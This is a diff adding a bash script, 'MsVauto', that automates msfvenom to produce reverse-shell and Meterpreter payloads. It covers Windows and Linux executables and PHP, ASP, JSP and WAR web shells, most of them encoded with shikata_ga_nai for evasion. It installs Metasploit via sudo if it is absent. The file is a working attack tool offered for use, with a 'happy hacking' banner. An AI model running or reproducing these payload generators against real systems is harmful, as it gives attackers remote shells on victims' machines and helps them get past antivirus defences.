@@ -1,0 +1,269 @@
+#!/bin/bash
+
+##############################################################################
+
+# This tool allows you to generate payloads with msfvenom automatically.
+# Choose which payload you want, hit enter and receive it without writing it.
+# You have the option to encode the payload you choose.
+# Made by Adkali with love
+
+##############################################################################
+
+
+## ## ## Just some colors for nice script when runs //
+EndC="\e[39m"
+Red="\e[31m"
+Blue="\e[34m"
+YB="\e[43m"
+LR="\e[101m"
+PP="\e[95m"
+PDefault="\e[49m"
+Bold="\e[1m"
+BNormal="\e[0m"
+Y="\e[33m"
+Light="\e[96m"
+
+## ## ## Args [ Local, Port ] 
+IP=""
+LHOST=""
+## ## ## The input users asks when it come to WebPayloads //
+IP="${1}"
+LPORT="${2}"
+P="PHP"
+A="ASP"
+R="RAW"
+W="WAR"
+
+## ## ## Show user Help when he asks for it //
+Help(){
+echo "Syntax: MsVauto [Local-IpAddress] [LocalPort]
+Example : MsVauto 192.168.0.1 4444 [Press Enter]
+----------------------------------------------------
+ MsVauto help
+ -v                                  --version"
+}
+Version(){
+echo "Version: 1.0
+Author: Adkali
+Last Update: 1/05/2022
+-
+Having problem? let me know please!
+MsVauto is a a tool created by Adkali with the option to generate payloads easly with msfvenom.
+Use the correct syntax, choose payload and have fun while hacking, good luck."
+}
+while getopts ":hv" options; do
+   case $options in
+      h) ## ## ## Show the user the syntax of how to use the tool [ Easy As that ]
+         Help
+         exit;;
+     \?)
+         echo "Wrong Input!"
+         exit;;
+      v) ## ## ## Print the Version and Exit.
+         Version
+         exit;;
+    esac
+ done
+if [[ "$1" == "" ]] || [[ "$2" == "" ]];then
+echo "Wrong Syntax! Use the -h flag for explain."
+ exit
+  fi
+
+# Banner //
+ShowBanner(){
+echo "
+$███╗░░░███╗░██████╗██╗░░░██╗░█████╗░██╗░░░██╗████████╗░█████╗░
+$████╗░████║██╔════╝██║░░░██║██╔══██╗██║░░░██║╚══██╔══╝██╔══██╗
+$██╔████╔██║╚█████╗░╚██╗░██╔╝███████║██║░░░██║░░░██║░░░██║░░██║
+$██║╚██╔╝██║░╚═══██╗░╚████╔╝░██╔══██║██║░░░██║░░░██║░░░██║░░██║
+$██║░╚═╝░██║██████╔╝░░╚██╔╝░░██║░░██║╚██████╔╝░░░██║░░░╚█████╔╝
+$╚═╝░░░░░╚═╝╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝░╚═════╝░░░░╚═╝░░░░╚════╝░
+         [+] Made by Adkali | [+] Happy Hacking
+"
+}
+ShowBanner
+sleep 0.5
+
+## ## ## Show the user his IP before continue //
+ifconfig | awk 'NR==10 {print $2}'
+sleep 1
+echo -e "${LR}This is your LocalHost, Happy Hacking!${PDefault}"
+
+## ## ## Checking for MetaSPloit-FrameWork, if exist -> continue, otherwise, install it //
+echo "Please wait..."
+sleep 1
+Check_PKG="metasploit-framework"
+ PKG_OK=$(dpkg-query -W --showformat='${Package}\n' $Check_PKG|grep "metasploit-framework")
+echo -e "${Red}Checking for $Check_PKG: $PKG_OK${EndC}"
+ if [ "" = "$PKG_OK" ]; then
+echo -e "${Red}No $Check_PKG! Installing $Check_PKG...${EndC}"
+ sudo apt-get --yes install $Check_PKG
+  fi
+sleep 1
+
+echo -e "# This tool allows you to generate ${YB}payloads${PDefault} with msfvenom automatically."
+sleep 0.5
+echo -e "# Choose which payload you want, press enter and receive it without writing it."
+sleep 0.5
+echo -e "# You have the option to ${YB}encode${PDefault} the payload you choose."
+sleep 0.5
+echo -e "${PP}# Made by Adkali with love.\n${EndC}"
+sleep 0.5
+## ## ## The user must choose a nummber from the list of payloads //
+echo -e "1 - Non Meterpreter Binaries [Staged] [${Y}Windows${EndC}] - ${Red}Windowsx64x86${EndC}"
+echo -e "2 - Non Meterpreter Binaries [Staged] [${Blue}Linux${EndC}] - LinuXx64x86"
+echo -e "3 - Non Meterpreter Binaries [Stageless] [${Y}Windows${EndC}] - ${Red}Windowsx64x86${EndC}"
+echo -e "4 - Non Meterpreter Binaries [Stageless] [${Blue}Linux${EndC}] - LinuXx64x86"
+echo -e "5 - Non Meterpreter Web Payload ${Y}PHP, ASP, JSP, WAR${EndC}"
+echo -e "6 - Meterpreter Binaries [Staged] [${Y}Windows${EndC}] - ${Red}Windowsx64x86${EndC}"
+echo -e "7 - Meterpreter Binaries [Staged] [${Blue}Linux${EndC}] - LinuXx64x86"
+echo -e "8 - Meterpreter Binaries [Stageless] [${Y}Windows${EndC}] - ${Red}Windowsx64x86${EndC}"
+echo -e "9 - Meterpreter Binaries [Stageless] [${Blue}Linux${EndC}] - LinuXx64x86"
+echo -e "10 - Meterpreter Web Payload ${Red}PHP, ASP, JSP, WAR${EndC}"
+
+
+printf "${Bold}Enter the number next to the PAYLOAD you want${BNormal} : "
+read -r Payload
+if [[ $Payload == "1" ]]; then
+sleep 1
+ echo -e "${Light}Staged Payloads for Windows x64x86${EndC} >> $HOME/"
+sleep 1
+ echo -e "${Y}[+]x86 PAYLOAD.....${EndC}"
+sleep 1
+ echo "RW5jb2RpbmcgUGF5bG9hZAo=" | base64 -d
+sleep 1
+msfvenom -p windows/shell/reverse_tcp -e x86/shikata_ga_nai -b '\x00' LHOST=$IP LPORT=$LPORT -f exe > shell-x86.exe
+sleep 1
+ echo -e "${Y}[+]x64 PAYLOAD......${EndC}"
+sleep 1
+msfvenom -p windows/x64/shell_reverse_tcp -e x86/shikata_ga_nai -b '\x00' LHOST=$IP LPORT=$LPORT -f exe > shell-x64.exe
+elif [[ $Payload == "2" ]]; then
+sleep 1
+ echo -e "${Light}Staged Payloads for Linux x64x86${EndC} >> $HOME/"
+sleep 1
+ echo -e"${Y}[+]x86 PAYLOAD.....${EndC}"
+sleep 1
+ echo "RW5jb2RpbmcgUGF5bG9hZAo=" | base64 -d
+sleep 1
+msfvenom -p linux/x86/shell/reverse_tcp -e x86/shikata_ga_nai -b '\x00' LHOST=$IP LPORT=$LPORT -f elf > shell-x86.elf
+sleep 1
+ echo -e "${Y}[+]x64 PAYLOAD......${EndC}"
+msfvenom -p linux/x64/shell/reverse_tcp -e x86/shikata_ga_nai -b '\x00' LHOST=$IP LPORT=$LPORT -f elf > shell-x64.elf
+elif [[ $Payload == "3" ]]; then
+sleep 1
+ echo -e "${Light}Stageless Payloads for Windows x64x86${EndC} >> $HOME/"
+sleep 1
+ echo -e "${Y}[+]x86 PAYLOAD.....${EndC}"
+sleep 1
+ echo "RW5jb2RpbmcgUGF5bG9hZAo=" | base64 -d
+sleep 1
+msfvenom -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -b '\x00' LHOST=$IP LPORT=$LPORT -f exe > shell-x86.exe
+sleep 1
+ echo -e "${Y}[+]x64 PAYLOAD......${EndC}"
+sleep 1
+msfvenom -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -b '\x00' LHOST=$IP LPORT=$LPORT -f exe > shell-x64.exe
+sleep 1
+elif [[ $Payload == "4" ]]; then
+sleep 1
+ echo -e "${Light}stageless Payloads for Linux x86x64${EndC} >> $HOME/"
+sleep 1
+ echo -e "${Y}[+]x86 PAYLOAD.....${EndC}"
+sleep 1
+ echo "RW5jb2RpbmcgUGF5bG9hZAo=" | base64 -d
+sleep 1
+msfvenom -p linux/x86/shell_reverse_tcp -e x86/shikata_ga_nai -b '\x00' LHOST=$IP LPORT=$LPORT -f elf > shell-x86.elf
+sleep 1
+ echo -e "${Y}[+]x64 PAYLOAD......${EndC}"
+sleep 1
+msfvenom -p linux/x64/shell_reverse_tcp -e x86/shikata_ga_nai -b '\x00' LHOST=$IP LPORT=$LPORT -f elf > shell-x64.elf
+elif [[ $Payload == "5" ]]; then
+ echo "'P' for PHP, 'A' for ASP, 'R' for RAW, 'W' for WAR : "
+read answers
+if [[ $answers == "P" ]]; then
+ echo -e "${Y}Creating a php PAYLOAD, please wait... >> $/HOME${EndC}"
+sleep 1
+msfvenom -p php/reverse_php LHOST=$IP LPORT=$LPORT -f raw > shell.php
+elif [[ $answers == "A" ]]; then
+ echo -e "${Y}Creating ASP PAYLOAD, please wait...${EndC}"
+sleep 1
+msfvenom -p windows/shell/reverse_tcp LHOST=$IP LPORT=$LPORT -f asp > shell.asp
+elif [[ $answers == "R" ]]; then
+ echo -e "${Y}Creating RAW PAYLOAD, please wait...${EndC}"
+sleep 1
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=$IP LPORT=$LPORT -f raw > shell.jsp
+elif [[ $answers == "W" ]]; then
+ echo -e "${Y}Creating WAR PAYLOAD, please wait...${EndC}"
+sleep 1
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=$IP LPORT=$LPORT -f war > shell.war
+  fi
+fi
+## ## ## Start a new condition, but continue the above one //
+if [[ $Payload == "6" ]]; then
+ echo -e "${Light}Staged Payloads for Windows x64x86 >> $/HOME${EndC}"
+sleep 1
+echo -e "${Y}[+]x86 PAYLOAD.....${EndC}"
+sleep 1
+ echo "RW5jb2RpbmcgUGF5bG9hZAo=" | base64 -d
+sleep 1
+msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -b '\x00' LHOST=$IP LPORT=$LPORT -f exe > shell-x86.exe
+sleep 1
+ echo -e "${Y}[+]x64 PAYLOAD......${EndC}"
+sleep 1
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$IP LPORT=$LPORT -f exe > shell-x64.exe
+elif [[ $Payload == "7" ]]; then
+ echo -e "$Light}Staged Payload for Linux x64x86 >> $/HOME${EndC}"
+sleep 1
+ echo -e "${Y}[+]x86 PAYLOAD.....${EndC}"
+sleep 1
+ echo "RW5jb2RpbmcgUGF5bG9hZAo=" | base64 -d
+sleep 1
+msfvenom -p linux/x86/shell/reverse_tcp -e x86/shikata_ga_nai -b '\x00' LHOST=$IP LPORT=$LPORT -f elf > shell-x86.elf
+sleep 1
+ echo -e "${Y}[+]x64 PAYLOAD......${EndC}"
+sleep 1
+msfvenom -p linux/x64/shell/reverse_tcp -e x86/shikata_ga_nai -b '\x00' LHOST=$IP LPORT=$LPORT -f elf > shell-x64.elf
+elif [[ $Payload == "8" ]];then
+ echo -e "${Light}Stageless Payload for Windows x64x86${EndC}"
+sleep 1
+ echo "RW5jb2RpbmcgUGF5bG9hZAo=" | base64 -d
+sleep 1
+ echo -e "{Y}[+]x86 PAYLOAD.....${EndC}"
+sleep 1
+msfvenom -p windows/meterpreter_reverse_tcp LHOST=$IP LPORT=$LPORT -f exe > shell-x86.exe
+sleep 1
+ echo -e "${Y}[+]x64 PAYLOAD.....${EndC}"
+sleep 1
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$IP LPORT=$LPORT -f exe > shell-x64.exe
+elif [[ $Payload == "9" ]]; then
+ echo -e "${Light}Stageless Payload for Linux x64x86${EndC}"
+sleep 1
+ echo "RW5jb2RpbmcgUGF5bG9hZAo=" | base64 -d
+sleep 1
+ echo -e "{Y}[+]x86 PAYLOAD.....${EndC}"
+sleep 1
+msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=$IP LPORT=$LPORT -f elf > shell-x86.elf
+sleep 1
+ echo -e "${Y}[+]x64 PAYLOAD.....${EndC}"
+sleep 1
+msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=$IP LPORT=$LPORT -f elf > shell-x64.elf
+elif [[ $Payload == "10" ]]; then
+ echo "'P' for PHP, 'A' for ASP, 'R' for RAW, 'W' for WAR : "
+read answers
+if [[ $answers == "P" ]]; then
+ echo -e "${Y}Creating a php Meterpreter web PAYLOAD, please wait... >> $/HOME${EndC}"
+sleep 1
+msfvenom -p php/meterpreter_reverse_tcp LHOST=$IP LPORT=$LPORT -f raw > shell.php
+elif [[ $answers == "A" ]]; then
+ echo -e "${Y}Creating ASP Meterpreter web PAYLOAD, please wait...${EndC}"
+sleep 1
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$LPORT -f asp > shell.asp
+elif [[ $answers == "R" ]]; then
+ echo -e "${Y}Creating RAW Meterpreter web PAYLOAD, please wait...${EndC}"
+sleep 1
+	msfvenom -p java/jsp_shell_reverse_tcp LHOST=$IP LPORT=$LPORT -f raw > example.jsp
+elif [[ $answers == "W" ]]; then
+ echo -e "${Y}Creating a WAR Meterpreter web PAYLOAD, please wait...${EndC}"
+sleep 1
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=$IP LPORT=$lport -f war > example.war
+   fi
+fi  
